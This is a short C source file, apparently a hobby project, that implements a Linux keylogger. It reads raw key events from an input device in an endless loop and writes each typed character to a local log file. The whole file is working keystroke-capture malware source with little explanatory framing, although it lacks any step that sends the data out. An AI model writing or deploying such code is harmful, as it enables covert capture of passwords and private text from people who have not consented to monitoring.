
/*
Author: Shiv Kumar
Subject: Keyloger

*/

#include<stdio.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<sys/stat.h>

#define LOGFILE "keyloger/data.txt"

int main(int argc, char *argv)
{

//printf("hello world\n:");

struct input_event ev;

//event3 works only for system keyboard 
//int fd = open("/dev/input/event3",O_RDONLY);

//for usb keyboard, handler change time to time so check once if it not work eg. event5, event6
int fd = open("/dev/input/event5",O_RDONLY);

/*
if(fd){
printf("fd found: %d\n",fd);
}else{
printf("fd not found: %d\n",fd);
}
*/

FILE *fp = fopen(LOGFILE, "w+");
//char *map = "..1234567890-=..qwertyuiop[]\n.asdfghjkl;'\\zxcvbnm,./";
char *map = "..1234567890....qwertyuiop....asdfghjkl.....zxcvbnm";
while(1)
{
read(fd, &ev, sizeof(ev));
//fflush(stdout);


if((ev.type == EV_KEY) && (ev.value == 0)){
    
   // printf("%d\n", ev.code);
   // printf("hello world\n:");
//   printf("%c", map[ev.code]);


fflush(fp); //to write text on file its important

/*
switch(ev.code)
{
case 28:
     putchar('\n');
     break;
case 57:
    putchar(' ');
     break;
default:
    putchar(map[ev.code]);
  
}*/

switch(ev.code)
{
case 28: 
    fprintf(fp, "\n");
    break;
case 57:
    fprintf(fp, " ");
    break;
default:
   fprintf(fp, "%c", map[ev.code]);

}


}
/*
else{

printf("else part\n:");
}
*/
}
fclose(fp);
close(fd);
}
